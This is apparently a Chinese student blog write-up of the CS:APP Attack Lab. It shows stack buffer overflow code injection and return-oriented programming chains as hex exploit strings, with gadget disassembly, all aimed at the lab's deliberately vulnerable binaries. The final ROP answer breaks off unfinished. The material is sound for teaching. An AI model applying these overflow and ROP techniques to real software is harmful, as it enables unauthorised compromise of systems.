<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>[csapp] Lab3 Attack Lab - Ubios home</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Ubios home"><meta name="msapplication-TileImage" content="/img/mylogo_h.png"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Ubios home"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="Attack lab for csapp."><meta property="og:type" content="blog"><meta property="og:title" content="[csapp] Lab3 Attack Lab"><meta property="og:url" content="https://chenghuawang.github.io/2022/02/11/[csapp]%20Lab3%20Attack%20Lab/"><meta property="og:site_name" content="Ubios home"><meta property="og:description" content="Attack lab for csapp."><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://chenghuawang.github.io/2022/02/11/[csapp]%20Lab3%20Attack%20Lab/Untitled.png"><meta property="og:image" content="https://chenghuawang.github.io/2022/02/11/[csapp]%20Lab3%20Attack%20Lab/Untitled%201.png"><meta property="og:image" content="https://chenghuawang.github.io/2022/02/11/[csapp]%20Lab3%20Attack%20Lab/Untitled%202.png"><meta property="og:image" content="https://chenghuawang.github.io/2022/02/11/[csapp]%20Lab3%20Attack%20Lab/Untitled%203.png"><meta property="og:image" content="https://chenghuawang.github.io/2022/02/11/[csapp]%20Lab3%20Attack%20Lab/Untitled%204.png"><meta property="og:image" content="https://chenghuawang.github.io/2022/02/11/[csapp]%20Lab3%20Attack%20Lab/Untitled%205.png"><meta property="og:image" content="https://chenghuawang.github.io/2022/02/11/[csapp]%20Lab3%20Attack%20Lab/Untitled%206.png"><meta property="article:published_time" content="2022-02-11T07:31:00.000Z"><meta property="article:modified_time" content="2022-02-11T07:37:58.350Z"><meta property="article:author" content="WangCH"><meta property="article:tag" content="CSAPP"><meta property="article:tag" content="computer-architecture"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/2022/02/11/[csapp]%20Lab3%20Attack%20Lab/Untitled.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://chenghuawang.github.io/2022/02/11/[csapp]%20Lab3%20Attack%20Lab/"},"headline":"[csapp] Lab3 Attack Lab","image":["https://chenghuawang.github.io/2022/02/11/[csapp]%20Lab3%20Attack%20Lab/Untitled.png","https://chenghuawang.github.io/2022/02/11/[csapp]%20Lab3%20Attack%20Lab/Untitled%201.png","https://chenghuawang.github.io/2022/02/11/[csapp]%20Lab3%20Attack%20Lab/Untitled%202.png","https://chenghuawang.github.io/2022/02/11/[csapp]%20Lab3%20Attack%20Lab/Untitled%203.png","https://chenghuawang.github.io/2022/02/11/[csapp]%20Lab3%20Attack%20Lab/Untitled%204.png","https://chenghuawang.github.io/2022/02/11/[csapp]%20Lab3%20Attack%20Lab/Untitled%205.png","https://chenghuawang.github.io/2022/02/11/[csapp]%20Lab3%20Attack%20Lab/Untitled%206.png"],"datePublished":"2022-02-11T07:31:00.000Z","dateModified":"2022-02-11T07:37:58.350Z","author":{"@type":"Person","name":"WangCH"},"publisher":{"@type":"Organization","name":"Ubios home","logo":{"@type":"ImageObject","url":"https://chenghuawang.github.io/img/mylogo_h.png"}},"description":"Attack lab for csapp."}</script><link rel="canonical" href="https://chenghuawang.github.io/2022/02/11/[csapp]%20Lab3%20Attack%20Lab/"><link rel="icon" href="/img/mylogo_h.png"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.2/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><!--!--><!--!--><meta name="generator" content="Hexo 5.4.0"></head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/mylogo_h.png" alt="Ubios home" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/chenghuaWang"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2022-02-11T07:31:00.000Z" title="2022/2/11 下午3:31:00">2022-02-11</time>发表</span><span class="level-item"><time dateTime="2022-02-11T07:37:58.350Z" title="2022/2/11 下午3:37:58">2022-02-11</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/computer-architecture/">computer architecture</a></span><span class="level-item">16 分钟读完 (大约2361个字)</span></div></div><h1 class="title is-3 is-size-4-mobile">[csapp] Lab3 Attack Lab</h1><div class="content"><h1 id="Lab3-Attack-Lab"><a href="#Lab3-Attack-Lab" class="headerlink" title="Lab3 Attack Lab"></a>Lab3 Attack Lab</h1><h1 id="1-Introduction"><a href="#1-Introduction" class="headerlink" title="1. Introduction"></a>1. Introduction</h1><p>此实验用来熟悉，理解程序运行的时候的 stack 模型。更进一步理解 stack 上可能发生的错误，对常见的攻击手段有深入理解。</p>
<h1 id="2-ctarget-代码注入"><a href="#2-ctarget-代码注入" class="headerlink" title="2. ctarget(代码注入)"></a>2. ctarget(代码注入)</h1><p>对于没有进行如下限制的程序可以使用此方法来进行攻击</p>
<ul>
<li>申请的stack空间不是随机的，是固定的。</li>
<li>使用了不安全的写入方法，或者使用了低级的io，且没有人为的判断缓冲溢出的程序</li>
<li>没有限制内存中的某些stack区域中的指令不能被执行。</li>
</ul>
<h2 id="2-1-Level-1"><a href="#2-1-Level-1" class="headerlink" title="2.1 Level 1"></a>2.1 Level 1</h2><p>要求对 buf 的缓冲区进行溢出，进而让 test 函数不会正常返回，而是运行到 touch1 函数。显然我们需要把 test 栈顶的 ret 指针指向的位置进行覆盖，来指向 touch1 函数。通过 <code>objdump -d</code> 指令，得到 ctarget 的汇编代码，找到 touch1 的位置在 <code>00000000004017c0 &lt;touch1&gt;</code> 。在 lab 给出的 writeup 中，我们知道 test 函数 c code 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function">2</span>&#123;</span><br><span class="line"><span class="number">3</span> <span class="keyword">int</span> val;</span><br><span class="line"><span class="number">4</span> val = getbuf();</span><br><span class="line"><span class="number">5</span> <span class="built_in">printf</span>(<span class="string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line"><span class="number">6</span> &#125;</span><br></pre></td></tr></table></figure>

<p>其调用了 getbuf() 函数， 查看该函数的汇编代码如下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000004017</span>a8 &lt;getbuf&gt;:</span><br><span class="line">  <span class="number">4017</span>a8:	<span class="number">48</span> <span class="number">83</span> ec <span class="number">28</span>          	sub    $<span class="number">0x28</span>,%rsp</span><br><span class="line">  <span class="number">4017</span>ac:	<span class="number">48</span> <span class="number">89</span> e7             	mov    %rsp,%rdi</span><br><span class="line">  <span class="number">4017</span>af:	e8 <span class="number">8</span>c <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">401</span>a40 &lt;Gets&gt;</span><br><span class="line">  <span class="number">4017b</span>4:	b8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x1</span>,%eax</span><br><span class="line">  <span class="number">4017b</span>9:	<span class="number">48</span> <span class="number">83</span> c4 <span class="number">28</span>          	add    $<span class="number">0x28</span>,%rsp</span><br><span class="line">  <span class="number">4017b</span>d:	c3                   	retq   </span><br><span class="line">  <span class="number">4017b</span>e:	<span class="number">90</span>                   	nop</span><br><span class="line">  <span class="number">4017b</span>f:	<span class="number">90</span>                   	nop</span><br></pre></td></tr></table></figure>

<p>可以得知，该函数在 stack 中申请了 40 bytes，所以我们需要污染41→48 bytes。显然，我们可以得到最简单的注入编码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">c0 <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure>

<p>可以画出这个攻击的最终内存形态如下：</p>
<p><img src="/2022/02/11/[csapp]%20Lab3%20Attack%20Lab/Untitled.png" alt="Figure1: referenced from [1]"></p>
<p>Figure1: referenced from [1]</p>
<h2 id="2-2-Level-2"><a href="#2-2-Level-2" class="headerlink" title="2.2 Level 2"></a>2.2 Level 2</h2><p>这个题目要求 test 函数会执行 touch2 函数， 而 touch2 函数需要一个存储了 cookie 无符号整型的 %rdi，所以我们需要首先把 %rdi 存储这个 cookie 值， 然后再跳转到 touch2 函数。</p>
<p>需要使用到 <code>movq $(cookie), %rdi</code> 的指令，这里 cookie 由下载来的作业中的 cookie 来定。</p>
<p>所以首先写一个包含这个指令的 <code>x.s</code> 文件， 然后使用 <code>gcc -c x.s</code> 来得到 object 文件，然后使用  <code>objdump -d</code> 来得到最终的指令为 <code>48 c7 c7 fa 97 69 59</code> ，</p>
<p>所以基本的思路是这样的：</p>
<ul>
<li><code>movq $cookie, %rdi</code></li>
<li><code>pushq (address of touch2)</code></li>
<li><code>ret</code></li>
</ul>
<hr>
<p><em><strong>Aside</strong></em></p>
<p>这里 ret 和 pushq 的作用似乎非常让人疑惑，为什么 ret 会回到 pushq 的地址？这里的 ret 使用的是近返回，近返回的方法是把栈顶之值弹出到指令指针寄存器IP中，然后从这个弹出的指针处进行执行。</p>
<p><img src="/2022/02/11/[csapp]%20Lab3%20Attack%20Lab/Untitled%201.png" alt="Figurew: Referenced from [2]"></p>
<p>Figurew: Referenced from [2]</p>
<p>看图，这是两个不同的指令，编码都不一样。ret表示近返回，retf表示远返回。</p>
<hr>
<p>所以使用 <code>gcc -c</code> 指令编码如下的程序</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq $cookie, %rdi <span class="meta"># change cookie to your own one.</span></span><br><span class="line">pushq %rsp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>这里就需要找到 <code>getbuf</code> 的栈顶在哪里，我们需要把 test 函数的 ret 函数的 ret address 换成 getbuf 的 栈顶。使用 gdb 调试， 把断点打在 getbuf 初始化完 %rsp 的位置。然后 <code>run -q</code> 运行，并使用 <code>info r rsp</code> 得到寄存器目前存储的地址信息。可以得到如下的答案。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">48</span> c7 c7 fa <span class="number">97</span> b9 <span class="number">59</span> <span class="number">68</span></span><br><span class="line">ec <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> c3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">78</span> dc <span class="number">61</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure>

<p>可以画出这个攻击的最终内存形态如下：</p>
<p><img src="/2022/02/11/[csapp]%20Lab3%20Attack%20Lab/Untitled%202.png" alt="Figure3: Referenced from [1]"></p>
<p>Figure3: Referenced from [1]</p>
<h2 id="2-3-Level-3"><a href="#2-3-Level-3" class="headerlink" title="2.3 Level 3"></a>2.3 Level 3</h2><p>这个题目要求 test 函数会执行 touch3 函数， 而 touch3 函数需要一个存储了 cookie 字符串的 %rdi，所以我们需要首先把 %rdi 存储这个 cookie 字符串的指针值， 然后再跳转到 touch3 函数。</p>
<p>所以这里的思路就是需要把 字符串首先存储到一个位置， 然后把这个位置的首地址传给 %rdi， 然后进入到 touch3 函数执行。</p>
<p>！但是这里 writeup 让我们注意的是当调用<code>hexmatch</code>和<code>strncmp</code>时，他们会把数据压入到栈中，有可能会覆盖<code>getbuf</code>栈帧的数据，所以传进去字符串的位置必须小心谨慎。hexmatch 开辟了110字节的栈帧，strncmp 也会开辟空间，但是就代码来看，*s存放的地址是随机的，如果我们将数据放在 getbuf 的栈空间里面，很有可能就被这两个函数覆盖了。所以在这里的思路是，把字符串传入到 caller→test 的stack 区域中，这样字符串可以避免被覆盖。</p>
<p>！对于 ascii 码， 我们可以使用 man ascii 来查看对应 ascii 码的 hex 形式。</p>
<p>！字符串 必须以 <code>\0</code> 结尾。</p>
<p>那么对应的思路如下：</p>
<ul>
<li>把 字符串 传入到 test 栈区中。</li>
<li>把 字符串的指针 传给 %rdi</li>
<li>pushq touch3 地址</li>
<li>ret</li>
</ul>
<p>至于怎么取到字符串的指针，怎么得到这些指令的编码，与 section 2.2 中一致。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">48</span> c7 c7 a8 dc <span class="number">61</span> <span class="number">55</span> <span class="number">68</span> <span class="meta"># mov and push</span></span><br><span class="line">fa <span class="number">18</span> <span class="number">40</span> <span class="number">00</span> c3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="meta"># push and ret</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">78</span> dc <span class="number">61</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="meta"># pointer to test stack top</span></span><br><span class="line"><span class="number">35</span> <span class="number">39</span> <span class="number">62</span> <span class="number">39</span> <span class="number">39</span> <span class="number">37</span> <span class="number">66</span> <span class="number">61</span> <span class="meta"># string of cookie</span></span><br><span class="line"><span class="number">00</span> # <span class="string">&#x27;\0&#x27;</span> <span class="keyword">for</span> <span class="built_in">string</span>.</span><br></pre></td></tr></table></figure>

<p>可以画出这个攻击的最终内存形态如下：</p>
<p><img src="/2022/02/11/[csapp]%20Lab3%20Attack%20Lab/Untitled%203.png" alt="Figure4: Referenced from [1]"></p>
<p>Figure4: Referenced from [1]</p>
<h1 id="3-rtarget-Return-Oriented-Programming"><a href="#3-rtarget-Return-Oriented-Programming" class="headerlink" title="3. rtarget(Return-Oriented Programming)"></a>3. rtarget(Return-Oriented Programming)</h1><p>在 section 2 ctarget 中三条都被启用的情况下，只能使用这个方法。</p>
<h2 id="3-0-review"><a href="#3-0-review" class="headerlink" title="3.0 review"></a>3.0 review</h2><p><img src="/2022/02/11/[csapp]%20Lab3%20Attack%20Lab/Untitled%204.png" alt="Untitled"></p>
<p>在栈使用了 randomization 来初始化 stack frame 大小；限制了 memory 中 stack 某些区块的代码执行权限的情况下，需要使用 Return-Oriented Programming 的方法，这个方法的基本想法就是使用已经存在的指令来作为自己的指令执行，从而绕开 stack 区域中的限制。一般而言，可以使用的指令后面需要跟有一个 ret 来返回，通过一系列的指令 <code>[op, ret]-&gt;[op, ret]-&gt;...</code> 可以形成一个 list， 这个形似单链表的结构就是我们的指令的组成。</p>
<p>比如下面的这个具体的例子：</p>
<p>有如下的 c code</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setval_210</span><span class="params">(<span class="keyword">unsigned</span> *p)</span></span>&#123;</span><br><span class="line">*p = <span class="number">3347663060U</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>得到 assembly code：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000000000400f</span>15 &lt;setval_210&gt;:</span><br><span class="line">	<span class="number">400f</span>15: c7 <span class="number">07</span> d4 <span class="number">48</span> <span class="number">89</span> c7 movl $<span class="number">0xc78948d4</span>,(%rdi)</span><br><span class="line">	<span class="number">400f</span>1b: c3 retq</span><br></pre></td></tr></table></figure>

<p>上面这个 assembly code 就可以作为我们的 list 中的一个 node。 比如 <code>48 89 c7</code> 就是 <code>movl %rax, %rdi</code> 的一个指令代码，并且已经存在于 可执行代码块中，所以我们可以让 pc(program counter) 指向这个位置 <code>0x400f15 + 4</code> 来指向这个 movl 指令，在执行完以后需要立即 ret，然后执行到下一个 node。</p>
<h2 id="3-1-Level-2"><a href="#3-1-Level-2" class="headerlink" title="3.1 Level 2"></a>3.1 Level 2</h2><p>这个题目让我们做的和上一个 ctarget 中的 level 2 一致。但是我们需要使用 gadget list 来组成所有需要的指令。根据之前的思路，我们是直接把 cookie 存储到 %rdi，需要使用到 movq 和 pop 指令。根据 writeup 的提示，这是可以被使用的 gadget node：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000000000000000</span> &lt;start_farm&gt;:</span><br><span class="line">   <span class="number">0</span>:	b8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x1</span>,%eax</span><br><span class="line">   <span class="number">5</span>:	c3                   	retq   </span><br><span class="line"></span><br><span class="line"><span class="number">0000000000000006</span> &lt;getval_142&gt;:</span><br><span class="line">   <span class="number">6</span>:	b8 fb <span class="number">78</span> <span class="number">90</span> <span class="number">90</span>       	mov    $<span class="number">0x909078fb</span>,%eax</span><br><span class="line">   b:	c3                   	retq   </span><br><span class="line"></span><br><span class="line"><span class="number">000000000000000</span>c &lt;addval_273&gt;:</span><br><span class="line">   c:	<span class="number">8</span>d <span class="number">87</span> <span class="number">48</span> <span class="number">89</span> c7 c3    	lea    <span class="number">-0x3c3876b8</span>(%rdi),%eax</span><br><span class="line">  <span class="number">12</span>:	c3                   	retq   </span><br><span class="line"></span><br><span class="line"><span class="number">0000000000000013</span> &lt;addval_219&gt;:</span><br><span class="line">  <span class="number">13</span>:	<span class="number">8</span>d <span class="number">87</span> <span class="number">51</span> <span class="number">73</span> <span class="number">58</span> <span class="number">90</span>    	lea    <span class="number">-0x6fa78caf</span>(%rdi),%eax</span><br><span class="line">  <span class="number">19</span>:	c3                   	retq   </span><br><span class="line"></span><br><span class="line"><span class="number">000000000000001</span>a &lt;setval_237&gt;:</span><br><span class="line">  <span class="number">1</span>a:	c7 <span class="number">07</span> <span class="number">48</span> <span class="number">89</span> c7 c7    	movl   $<span class="number">0xc7c78948</span>,(%rdi)</span><br><span class="line">  <span class="number">20</span>:	c3                   	retq   </span><br><span class="line"></span><br><span class="line"><span class="number">0000000000000021</span> &lt;setval_424&gt;:</span><br><span class="line">  <span class="number">21</span>:	c7 <span class="number">07</span> <span class="number">54</span> c2 <span class="number">58</span> <span class="number">92</span>    	movl   $<span class="number">0x9258c254</span>,(%rdi)</span><br><span class="line">  <span class="number">27</span>:	c3                   	retq   </span><br><span class="line"></span><br><span class="line"><span class="number">0000000000000028</span> &lt;setval_470&gt;:</span><br><span class="line">  <span class="number">28</span>:	c7 <span class="number">07</span> <span class="number">63</span> <span class="number">48</span> <span class="number">8</span>d c7    	movl   $<span class="number">0xc78d4863</span>,(%rdi)</span><br><span class="line">  <span class="number">2</span>e:	c3                   	retq   </span><br><span class="line"></span><br><span class="line"><span class="number">000000000000002f</span> &lt;setval_426&gt;:</span><br><span class="line">  <span class="number">2f</span>:	c7 <span class="number">07</span> <span class="number">48</span> <span class="number">89</span> c7 <span class="number">90</span>    	movl   $<span class="number">0x90c78948</span>,(%rdi)</span><br><span class="line">  <span class="number">35</span>:	c3                   	retq   </span><br><span class="line"></span><br><span class="line"><span class="number">0000000000000036</span> &lt;getval_280&gt;:</span><br><span class="line">  <span class="number">36</span>:	b8 <span class="number">29</span> <span class="number">58</span> <span class="number">90</span> c3       	mov    $<span class="number">0xc3905829</span>,%eax</span><br><span class="line">  <span class="number">3b</span>:	c3                   	retq   </span><br><span class="line"></span><br><span class="line"><span class="number">000000000000003</span>c &lt;mid_farm&gt;:</span><br><span class="line">  <span class="number">3</span>c:	b8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x1</span>,%eax</span><br><span class="line">  <span class="number">41</span>:	c3                   	retq</span><br></pre></td></tr></table></figure>

<p>而我们需要的代码是：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">popq %rax</span><br><span class="line">movq %rax, %rdi</span><br></pre></td></tr></table></figure>

<p><code>popq %rax</code>的指令字节为：<code>58</code>，所以我们找到了如下函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000004019</span>a7 &lt;addval_219&gt;:</span><br><span class="line">  <span class="number">4019</span>a7: <span class="number">8</span>d <span class="number">87</span> <span class="number">51</span> <span class="number">73</span> <span class="number">58</span> <span class="number">90</span>     lea    <span class="number">-0x6fa78caf</span>(%rdi),%eax</span><br><span class="line">  <span class="number">4019</span>ad: c3</span><br></pre></td></tr></table></figure>

<p>从中我们可以得出<code>popq %rax</code>指令的地址为：<code>0x4019ab</code></p>
<p><code>movq %rax, %rdi</code>的指令字节为：<code>48 89 c7</code>，所以我们找到了如下函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0: 8d 87 48 89 c7 c3     lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6: c3</span><br></pre></td></tr></table></figure>

<p>从中我们可以得出<code>movq %rax, %rdi</code>指令的地址为：<code>0x4019a2</code></p>
<p>最终可以得出需要的指令为</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">ab <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="meta"># popq %rax</span></span><br><span class="line">fa <span class="number">97</span> b9 <span class="number">59</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="meta"># cookie need for movq, will be poped to %rax.</span></span><br><span class="line">a2 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="meta"># movq</span></span><br><span class="line">ec <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> # touch2</span><br></pre></td></tr></table></figure>

<p><img src="/2022/02/11/[csapp]%20Lab3%20Attack%20Lab/Untitled%205.png" alt="Untitled"></p>
<h2 id="3-2-Level-3"><a href="#3-2-Level-3" class="headerlink" title="3.2 Level 3"></a>3.2 Level 3</h2><p>这个题目让我们做的和上一个 ctarget 中的 level 3 一致。但是我们需要使用 gadget list 来组成所有需要的指令。 <strong>因为每次栈的位置是随机的，所以无法直接用地址来索引字符串的起始地址，只能用栈顶地址 + 偏移量来索引字符串的起始地址。对于获得偏移量的操作，leaq(, , ),%rax 这个操作是 gcc 经常用来获得偏移量的一个指令。</strong></p>
<p>我们可以得到下面的方法：</p>
<p>（1）首先获取到<code>%rsp</code>的地址，并且传送到<code>%rdi</code><br>（2）其二获取到字符串的偏移量值，并且传送到<code>%rsi</code><br>（3）<code>lea (%rdi,%rsi,1),%rax</code>, 将字符串的首地址传送到<code>%rax</code>, 再传送到<code>%rdi</code><br>（4）调用<code>touch3</code>函数</p>
<p>具体的 geaget 从frame.c 函数的 dump 文件中找到就行</p>
<p><img src="/2022/02/11/[csapp]%20Lab3%20Attack%20Lab/Untitled%206.png" alt="Untitled"></p>
<p>最终的答案是：</p>
